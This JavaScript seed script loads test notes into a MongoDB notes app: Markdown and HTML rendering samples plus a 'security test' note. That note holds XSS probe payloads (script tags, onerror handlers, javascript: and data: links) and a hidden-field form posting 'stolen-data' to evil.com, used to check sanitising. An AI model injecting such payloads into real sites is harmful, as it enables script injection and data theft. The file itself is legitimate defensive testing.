/**
 * 初始化 Markdown 测试数据脚本
 * 创建包含各种 Markdown 元素的测试笔记
 */

const mongoose = require('mongoose');
require('../config/env');
const Document = require('../models/Document');

// 测试 Markdown 内容
const markdownTestContent = `# Markdown 渲染测试

这是一个用于测试 Markdown 渲染功能的笔记，包含了各种常见的 Markdown 元素。

## 文本格式

这是**粗体文本**，这是*斜体文本*，这是~~删除线文本~~。

## 列表

### 无序列表

- 第一项
- 第二项
  - 嵌套项目 1
  - 嵌套项目 2
- 第三项

### 有序列表

1. 第一步
2. 第二步
3. 第三步

## 引用

> 这是一个引用块。
> 
> 可以包含多行内容，甚至包含其他 Markdown 元素：
> 
> - 列表项 1
> - 列表项 2

## 代码

### 行内代码

在文本中可以使用 \`console.log('Hello')\` 这样的行内代码。

### 代码块

#### JavaScript 代码

\`\`\`javascript
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

console.log(fibonacci(10));
\`\`\`

#### Python 代码

\`\`\`python
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n - 1) + fibonacci(n - 2)

print(fibonacci(10))
\`\`\`

#### CSS 代码

\`\`\`css
.highlight {
  background-color: #f8f9fa;
  border-radius: 4px;
  padding: 0.2em 0.4em;
  font-family: monospace;
}
\`\`\`

## 链接

这是一个[外部链接](https://github.com)，会在新窗口打开。

这是一个[相对链接](/api/documents)，也会在新窗口打开。

## 表格

| 姓名 | 年龄 | 职业 |
|------|------|------|
| 张三 | 28 | 工程师 |
| 李四 | 32 | 设计师 |
| 王五 | 45 | 产品经理 |

## 分割线

---

## 图片

![示例图片](https://via.placeholder.com/600x300/4285F4/FFFFFF?text=Markdown+渲染测试)

## 安全测试

以下是一些安全测试内容，应该被正确处理：

### XSS 测试

- 脚本标签测试: \`<script>alert('XSS')</script>\`
- 事件处理器测试: \`<img src="x" onerror="alert('XSS')"> \`
- JavaScript 协议测试: \`[javascript:alert('XSS')](javascript:alert('XSS'))\`

### HTML 标签测试

由于我们禁用了 HTML，以下内容应该显示为纯文本：

<div>这是一个 div 标签</div>
<span style="color: red;">红色文本</span>
<iframe src="https://example.com"></iframe>

## 数学公式（未来扩展）

当支持数学公式时，以下内容应该正确渲染：

行内公式: $E = mc^2$

块级公式:
$$
\\int_{-\\infty}^{\\infty} e^{-x^2} dx = \\sqrt{\\pi}
$$

## 总结

这个测试笔记包含了 Markdown 的各种元素，可以用来验证渲染引擎的正确性和安全性。
`;

// 连接数据库并插入测试数据
async function initMarkdownTestData() {
  try {
    // 连接数据库
    await mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/notes-app');
    console.log('已连接到 MongoDB');

    // 检查是否已存在测试文档
    const existingDoc = await Document.findOne({ title: 'Markdown 渲染测试笔记' });
    if (existingDoc) {
      console.log('Markdown 测试笔记已存在，跳过创建');
      return;
    }

    // 创建测试文档
    const testDocument = new Document({
      title: 'Markdown 渲染测试笔记',
      content: markdownTestContent,
      tags: ['markdown', '测试', '渲染', '安全'],
      source: '系统测试数据'
    });

    // 保存文档
    await testDocument.save();
    console.log('Markdown 测试笔记创建成功');

    // 创建一个包含潜在安全风险的测试文档
    const securityTestContent = `# 安全测试笔记

这个笔记包含一些潜在的安全风险内容，用于验证沙盒的安全性。

## XSS 测试

以下是一些常见的 XSS 攻击向量：

1. 脚本注入测试
   - <script>alert('XSS')</script>
   - <img src="x" onerror="alert('XSS')">
   - <svg onload="alert('XSS')">

2. 事件处理器测试
   - <div onclick="alert('XSS')">点击我</div>
   - <a href="javascript:alert('XSS')">恶意链接</a>

3. 协议测试
   - [javascript:alert('XSS')](javascript:alert('XSS'))
   - [data:text/html,<script>alert('XSS')</script>](data:text/html,<script>alert('XSS')</script>)

## 表单测试

<form action="https://evil.com" method="post">
  <input type="hidden" name="data" value="stolen-data">
  <button type="submit">提交</button>
</form>

## iframe 测试

<iframe src="https://evil.com" width="300" height="200"></iframe>

## 链接测试

[正常链接](https://example.com)

[恶意链接](javascript:alert('XSS'))

[钓鱼链接](https://evil.com/phishing)

这些内容应该被安全地渲染，不会执行任何脚本或导致安全问题。
`;

    const securityTestDocument = new Document({
      title: '安全测试笔记',
      content: securityTestContent,
      tags: ['安全', '测试', 'XSS', '沙盒'],
      source: '系统测试数据'
    });

    await securityTestDocument.save();
    console.log('安全测试笔记创建成功');

    // 创建一个包含HTML内容的测试文档
    const htmlTestContent = `<!DOCTYPE html>
<html>
<head>
    <title>HTML内容测试笔记</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        .demo-section { background: #f5f5f5; padding: 15px; margin: 10px 0; border-radius: 8px; }
        .interactive { background: #e3f2fd; padding: 15px; margin: 10px 0; border-radius: 8px; }
        button { background: #2196F3; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; margin: 5px; }
        button:hover { background: #1976D2; }
        .media-demo { text-align: center; margin: 20px 0; }
        img { max-width: 100%; height: auto; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>HTML内容测试笔记</h1>
        <p>这是一个纯HTML笔记，展示了各种HTML元素和交互功能。</p>
        
        <div class="demo-section">
            <h2>文本格式</h2>
            <p>这是<strong>粗体文本</strong>，这是<em>斜体文本</em>，这是<u>下划线文本</u>。</p>
            <p>这是<mark>高亮文本</mark>，这是<del>删除线文本</del>。</p>
        </div>
        
        <div class="demo-section">
            <h2>列表</h2>
            <ul>
                <li>无序列表项 1</li>
                <li>无序列表项 2</li>
                <li>无序列表项 3</li>
            </ul>
            <ol>
                <li>有序列表项 1</li>
                <li>有序列表项 2</li>
                <li>有序列表项 3</li>
            </ol>
        </div>
        
        <div class="demo-section">
            <h2>表格</h2>
            <table border="1" style="width: 100%; border-collapse: collapse;">
                <tr>
                    <th>功能</th>
                    <th>描述</th>
                    <th>状态</th>
                </tr>
                <tr>
                    <td>HTML渲染</td>
                    <td>直接渲染HTML内容</td>
                    <td>✅ 已实现</td>
                </tr>
                <tr>
                    <td>交互功能</td>
                    <td>支持JavaScript交互</td>
                    <td>✅ 已实现</td>
                </tr>
                <tr>
                    <td>媒体展示</td>
                    <td>支持图片和视频</td>
                    <td>✅ 已实现</td>
                </tr>
            </table>
        </div>
        
        <div class="interactive">
            <h2>交互功能</h2>
            <p>点击下面的按钮进行交互：</p>
            <button onclick="showMessage()">显示消息</button>
            <button onclick="changeColor()">改变颜色</button>
            <button onclick="toggleContent()">切换内容</button>
            <div id="messageArea" style="margin-top: 10px; padding: 10px; background: white; border-radius: 4px; display: none;"></div>
            <div id="toggleContent" style="margin-top: 10px; padding: 10px; background: white; border-radius: 4px; display: none;">
                这是切换显示的内容！
            </div>
        </div>
        
        <div class="media-demo">
            <h2>媒体展示</h2>
            <img src="https://via.placeholder.com/600x300/4285F4/FFFFFF?text=HTML+内容测试" alt="测试图片">
            <p>这是一个测试图片，展示了HTML笔记中的图片展示功能。</p>
        </div>
        
        <div class="demo-section">
            <h2>代码展示</h2>
            <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto;">
<code>function helloWorld() {
    console.log("Hello, World!");
    return "HTML笔记支持代码展示";
}</code></pre>
        </div>
        
        <div class="demo-section">
            <h2>链接测试</h2>
            <p>这是一个<a href="https://github.com" target="_blank">外部链接</a>，会在新窗口打开。</p>
        </div>
    </div>
    
    <script>
        function showMessage() {
            const messageArea = document.getElementById('messageArea');
            messageArea.textContent = '这是一个交互式消息！时间：' + new Date().toLocaleTimeString();
            messageArea.style.display = 'block';
        }
        
        function changeColor() {
            const container = document.querySelector('.container');
            const colors = ['#f5f5f5', '#e8f5e8', '#fff8e1', '#fce4ec', '#e3f2fd'];
            const randomColor = colors[Math.floor(Math.random() * colors.length)];
            container.style.backgroundColor = randomColor;
        }
        
        function toggleContent() {
            const content = document.getElementById('toggleContent');
            content.style.display = content.style.display === 'none' ? 'block' : 'none';
        }
        
        // 页面加载完成提示
        document.addEventListener('DOMContentLoaded', function() {
            console.log('HTML内容测试笔记已加载完成！');
        });
    </script>
</body>
</html>`;

    const htmlTestDocument = new Document({
      title: 'HTML内容测试笔记',
      htmlContent: htmlTestContent,
      tags: ['HTML', '测试', '交互', '媒体'],
      source: '系统测试数据'
    });

    await htmlTestDocument.save();
    console.log('HTML内容测试笔记创建成功');

  } catch (error) {
    console.error('初始化测试数据失败:', error);
  } finally {
    // 关闭数据库连接
    await mongoose.disconnect();
    console.log('已断开 MongoDB 连接');
  }
}

// 执行初始化
initMarkdownTestData();
